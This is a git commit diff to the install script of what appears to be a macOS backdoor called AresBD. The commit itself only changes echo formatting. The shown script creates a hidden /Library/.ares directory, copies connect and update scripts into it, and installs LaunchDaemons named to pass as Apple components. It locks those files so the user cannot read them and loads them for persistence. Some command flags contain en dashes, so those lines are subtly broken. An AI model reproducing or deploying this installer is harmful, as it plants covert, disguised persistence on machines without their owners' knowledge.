5edf15b54932e8591d45f8c3bb6be560a60a6982
Stsosz <sabergelpreston@icloud.com>
2015-03-03 20:04:47 -0500

    Fix more derping

--- ABDConsole/Ares/Server/install.sh
+++ ABDConsole/Ares/Server/install.sh
@@ -7,20 +7,20 @@
 #  Don't be an asshole. Don't use this without permission. I'm not responsible
 #  for any stupid stuff you do with AresBD.
 
-echo -e "Running a filesystem check... \c"
+echo "Running a filesystem check... "
 fsck –fy
 echo "Done."
 
-echo -e "Making sure that the filessystem is mounted with read-write access... \c"
+echo "Making sure that the filessystem is mounted with read-write access... "
 mount –uw /
 echo "Done"
 
-echo -e "Creating directories... \c"
+echo "Creating directories... "
 mkdir -vp /Library/.ares
 mkdir -vp /Library/LaunchDaemons
 echo "Done."
 
-echo -e "Copying files..."
+echo "Copying files..."
 cp -v /Volumes/Ares/Files/update.sh /Library/.ares/update.sh
 cp -v /Volumes/Ares/Files/connect.sh /Library/.ares/connect.sh
 cp -v /Volumes/Ares/Files/ares.conf /Library/.ares/ares.conf
@@ -28,20 +28,21 @@ cp -v /Volumes/Ares/Files/ares.conf /Library/.ares/ares.conf
 cp -v /Volumes/Ares/Files/com.apple.update.plist /Library/LaunchDaemons/com.apple.update.plist
 cp -v /Volumes/Ares/Files/com.apple.ares.plist /Library/LaunchDaemons/com.apple.ares.plist
 echo "Done."
+echo ""
 
-echo -e "Making everything executable... \c"
+echo "Making everything executable... "
 chmod +x /Library/.ares/connect.sh
 chmod +x /Library/.ares/update.sh
 echo "Done"
 echo ""
 
-echo -e "Making sure that the user cannot read plists... \c"
+echo "Making sure that the user cannot read plists... "
 chmod 600 /Library/LaunchDaemons/com.apple.ares.plist
 chmod 600 /Library/LaunchDaemons/com.apple.update.plist
 echo "Done."
 echo ""
 
-echo -e "Loading plists into LaunchCTL \c"
+echo "Loading plists into LaunchCTL "
 launchctl load /Library/LaunchDaemons/com.apple.ares.plist
 launchctl load /Library/LaunchDaemons/com.apple.update.plist
 echo "Done."
